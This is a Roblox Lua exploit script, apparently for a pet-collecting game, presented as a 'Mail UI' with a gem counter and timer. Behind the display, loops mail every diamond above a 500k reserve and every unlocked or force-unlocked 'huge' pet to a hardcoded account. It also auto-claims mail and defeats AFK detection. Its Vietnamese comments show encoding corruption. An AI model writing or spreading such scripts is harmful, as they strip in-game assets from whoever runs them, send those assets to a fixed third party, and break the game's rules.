-- // KenPhysical - Mail UI (White Neon + Safe Optimization + Timer)
local player = game.Players.LocalPlayer
local username = player and player.Name or "Unknown"

-- UI setup
local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
ScreenGui.Name = "KenPhysicalMailUI"
ScreenGui.IgnoreGuiInset = true
ScreenGui.ResetOnSpawn = false

-- N·ªÅn tr·∫Øng
local bg = Instance.new("Frame", ScreenGui)
bg.Size = UDim2.new(1, 0, 1, 0)
bg.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
bg.BorderSizePixel = 0
bg.BackgroundTransparency = 0.05

-- Hi·ªáu ·ª©ng neon
local function neon(label, color)
    local stroke = Instance.new("UIStroke", label)
    stroke.Thickness = 2
    stroke.Color = color
    stroke.Transparency = 0.4
    local glow = Instance.new("UIGradient", label)
    glow.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
        ColorSequenceKeypoint.new(1, color)
    }
    glow.Rotation = 45
end

-- Ti√™u ƒë·ªÅ
local Title = Instance.new("TextLabel", bg)
Title.Size = UDim2.new(1, 0, 0, 120)
Title.Position = UDim2.new(0, 0, 0.20, 0)
Title.BackgroundTransparency = 1
Title.Text = "üì¨ KenPhysical Mail System - " .. username
Title.TextColor3 = Color3.fromRGB(0, 200, 255)
Title.Font = Enum.Font.GothamBold
Title.TextScaled = true
neon(Title, Color3.fromRGB(0, 200, 255))

-- Gems Label
local GemsLabel = Instance.new("TextLabel", bg)
GemsLabel.Size = UDim2.new(1, 0, 0, 100)
GemsLabel.Position = UDim2.new(0, 0, 0.45, 0)
GemsLabel.BackgroundTransparency = 1
GemsLabel.Text = "üíé Gems hi·ªán c√≥: ..."
GemsLabel.TextColor3 = Color3.fromRGB(0, 150, 255)
GemsLabel.Font = Enum.Font.GothamBold
GemsLabel.TextScaled = true
neon(GemsLabel, Color3.fromRGB(0, 150, 255))

-- Online timer
local OnlineLabel = Instance.new("TextLabel", bg)
OnlineLabel.Size = UDim2.new(1, 0, 0, 70)
OnlineLabel.Position = UDim2.new(0, 0, 0.70, 0)
OnlineLabel.BackgroundTransparency = 1
OnlineLabel.Text = "üïì Online: 00:00"
OnlineLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
OnlineLabel.Font = Enum.Font.GothamSemibold
OnlineLabel.TextScaled = true
neon(OnlineLabel, Color3.fromRGB(0, 0, 0))

local startTime = tick()
task.spawn(function()
    while task.wait(1) do
        local elapsed = math.floor(tick() - startTime)
        local mins = math.floor(elapsed / 60)
        local secs = elapsed % 60
        OnlineLabel.Text = string.format("üïì Online: %02d:%02d", mins, secs)
    end
end)

-- Format number
local function formatNumber(n)
    if n >= 1e12 then
        return string.format("%.3fT", n / 1e12)
    elseif n >= 1e9 then
        return string.format("%.3fB", n / 1e9)
    elseif n >= 1e6 then
        return string.format("%.3fM", n / 1e6)
    elseif n >= 1e3 then
        return string.format("%.3fK", n / 1e3)
    else
        return string.format("%.3f", n)
    end
end

-- Safe getDiamonds
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local SaveFunction = require(ReplicatedStorage.Library.Client.Save).Get
local CurrencyCmds = require(ReplicatedStorage.Library.Client.CurrencyCmds)
local Items = require(ReplicatedStorage.Library.Items)

local function getDiamondsSafe()
    local ok, amt = pcall(function()
        return CurrencyCmds.Get("Diamonds")
    end)
    if ok and type(amt) == "number" then return amt end
    local save = SaveFunction and SaveFunction()
    if save and save.Inventory and save.Inventory.Currency then
        for _, cur in pairs(save.Inventory.Currency) do
            if cur.id == "Diamonds" and type(cur._am) == "number" then
                return cur._am
            end
        end
    end
    local entry = Items.Currency("Diamonds"):FindAny()[1]
    if entry and entry._data and type(entry._data._am) == "number" then
        return entry._data._am
    end
    return 0
end

-- Update Gems m·ªói 5s (fix l·ªói "lacking capability Plugin")
local RunService = game:GetService("RunService")
local gems = 0

-- Lu·ªìng ph·ª• ch·ªâ ƒë·ªçc d·ªØ li·ªáu, kh√¥ng ƒë·ª•ng UI
task.spawn(function()
	repeat task.wait(0.5) until pcall(function() return SaveFunction() ~= nil end)
	while task.wait(5) do
		gems = getDiamondsSafe()
	end
end)

-- Lu·ªìng ch√≠nh c·∫≠p nh·∫≠t UI (RenderStepped c√≥ quy·ªÅn ƒë·ª•ng Instance)
RunService.RenderStepped:Connect(function()
	GemsLabel.Text = "üíé Gems hi·ªán c√≥: " .. formatNumber(gems)
end)


-- Toggle b·∫±ng H
local UIS = game:GetService("UserInputService")
local visible = true
UIS.InputBegan:Connect(function(input, processed)
    if not processed and input.KeyCode == Enum.KeyCode.H then
        visible = not visible
        bg.Visible = visible
    end
end)

print("[‚úÖ] KenPhysical Mail UI loaded (Toggle = H)")

-----------------------------------------------------
-- MAIL SCRIPT (Gi·ªØ l·∫°i 1M gems)
-----------------------------------------------------
local PlayerToSend = "JackOmegaQueen"
local GemTreshold = 1000000   -- B·∫Øt ƒë·∫ßu g·ª≠i khi >= 2M gems
local KeepGems = 500000        -- üî• LU√îN GI·ªÆ L·∫†I 500k GEMS
local SendOnlyGems = false
local MailClaimInterval = 60

local RunService = game:GetService("RunService")
local LightningService = game:GetService("Lighting")
local LocalPlayer = game.Players.LocalPlayer
local NetworkPath = ReplicatedStorage.Network
local NetworkSource = require(ReplicatedStorage.Library.Client.Network)
local AlreadySend = {}

-- Optimization an to√†n
local function OptimizationSafe()
    local RunService = game:GetService("RunService")
    local Lighting = game:GetService("Lighting")

    pcall(function() RunService:Set3dRenderingEnabled(true) end)
    pcall(function() settings().Rendering.QualityLevel = Enum.QualityLevel.Level01 end)

    for _, effect in pairs(Lighting:GetChildren()) do
        if effect:IsA("BloomEffect") 
        or effect:IsA("SunRaysEffect") 
        or effect:IsA("DepthOfFieldEffect")
        or effect:IsA("BlurEffect")
        or effect:IsA("ColorCorrectionEffect") then
            effect.Enabled = false
        elseif effect:IsA("Atmosphere") then
            effect.Density = 0
            effect.Haze = 0
            effect.Color = Color3.new(1, 1, 1)
            effect.Decay = Color3.new(1, 1, 1)
        end
    end

    for _, obj in ipairs(workspace:GetDescendants()) do
        if workspace:FindFirstChild("__THINGS") and obj:IsDescendantOf(workspace.__THINGS) then
            continue
        end
        if obj:IsA("ParticleEmitter") or obj:IsA("Trail") 
        or obj:IsA("Smoke") or obj:IsA("Fire") or obj:IsA("Sparkles") then
            obj.Enabled = false
        end
    end
end


local function GetData()
	local Data = SaveFunction()
	if Data then
		local copy = {}
		for k,v in pairs(Data) do copy[k]=v end
		return copy
	end
	return nil
end

local function mailcost()
	local call = SaveFunction()
	local defcost = 20000
	if not call then return defcost end
	local MailIsReset = (call.MailboxResetTime and call.MailboxResetTime - workspace:GetServerTimeNow())
	local TotalMailsForSession = call.MailboxSendsSinceReset or 0
	if not MailIsReset or MailIsReset <= 0 then return defcost end
	if TotalMailsForSession >= 14 then return 5000000 end
	return math.ceil(defcost * math.pow(1.5, TotalMailsForSession))
end

local function genMessage()
	return "free gift " .. tostring(math.random(1,100))
end

local function SendMail(category,id,amount)
	return NetworkPath["Mailbox: Send"]:InvokeServer(PlayerToSend, genMessage(), category, id, amount or 1)
end

local function CheckInventory()
	local Data = GetData()
	local Gems = Items.Currency("Diamonds"):FindAny()[1]
	local GemsId = Gems._uid
	local GemsAmount = getDiamondsSafe()
	local MailCost = mailcost()
	
	-- üî• T√≠nh s·ªë gems c√≥ th·ªÉ g·ª≠i (sau khi gi·ªØ l·∫°i 1M)
	local availableToSend = GemsAmount - KeepGems - MailCost
	
	print("üíé Gems hi·ªán c√≥:", GemsAmount)
	print("üîí Gi·ªØ l·∫°i:", KeepGems)
	print("üí∞ Mail Cost:", MailCost)
	print("üì§ C√≥ th·ªÉ g·ª≠i:", availableToSend)

	-- Ch·ªâ g·ª≠i khi v∆∞·ª£t threshold V√Ä c√≤n th·ª´a sau khi gi·ªØ 1M
	if GemsAmount >= GemTreshold and availableToSend > 0 then
		print("üì¨ ƒêang g·ª≠i", availableToSend, "gems...")
		local sus, ms = SendMail("Currency", GemsId, availableToSend)
		
		if sus then
			print("‚úÖ G·ª≠i th√†nh c√¥ng!")
		else
			warn("‚ùå L·ªói g·ª≠i:", ms)
			
			-- Retry n·∫øu l·ªói inventory
			if ms and ms == "Couldn't remove this item from your inventory!" then
				task.wait(.25)
				local retryAmount = math.max(0, availableToSend - 1000000)
				if retryAmount > 0 then
					print("üîÑ Th·ª≠ l·∫°i v·ªõi", retryAmount, "gems...")
					SendMail("Currency", GemsId, retryAmount)
				end
			end
		end
	else
		print("‚è∏Ô∏è Kh√¥ng g·ª≠i (ch∆∞a ƒë·ªß threshold ho·∫∑c kh√¥ng ƒë·ªß gems sau khi gi·ªØ 1M)")
	end

	-- G·ª≠i pets (n·∫øu b·∫≠t)
	if GemsAmount - MailCost < 0 then return end
	if Data and Data.Inventory and not SendOnlyGems then
		for i,v in pairs(Data.Inventory.Pet or {}) do
			if string.find(v.id:lower(), "huge") and not AlreadySend[i] then
				if v._lk then 
					NetworkPath["Locking_SetLocked"]:InvokeServer(i, false) 
					task.wait(.25) 
				end
				local susses, ms = SendMail("Pet", i, 1)
				if susses then 
					print("‚úÖ ƒê√£ g·ª≠i pet:", v.id)
					AlreadySend[i]=true 
					task.wait(.25) 
				end
				if ms and ms=="They don't have enough space!" then 
					warn("‚ö†Ô∏è Ng∆∞·ªùi nh·∫≠n h·∫øt ch·ªó!")
					break 
				end
			end
		end
	end
end

-- Ch·ªëng AFK
task.spawn(function()
    pcall(function()
        game:GetService("ReplicatedStorage").Network["Idle Tracking: Stop Timer"]:FireServer()
    end)
    task.wait(0.2)

    local VirtualInputManager = game:GetService("VirtualInputManager")
    while task.wait(300) do
        pcall(function()
            VirtualInputManager:SendKeyEvent(true, "Space", false, game)
            task.wait(0.2)
            VirtualInputManager:SendKeyEvent(false, "Space", false, game)
        end)
    end
end)


OptimizationSafe()

task.spawn(function()
	while true do
		NetworkPath["Mailbox: Claim All"]:InvokeServer()
		task.wait(MailClaimInterval)
	end
end)

task.spawn(function()
	while true do
		pcall(CheckInventory)
		task.wait(10)
	end
end)
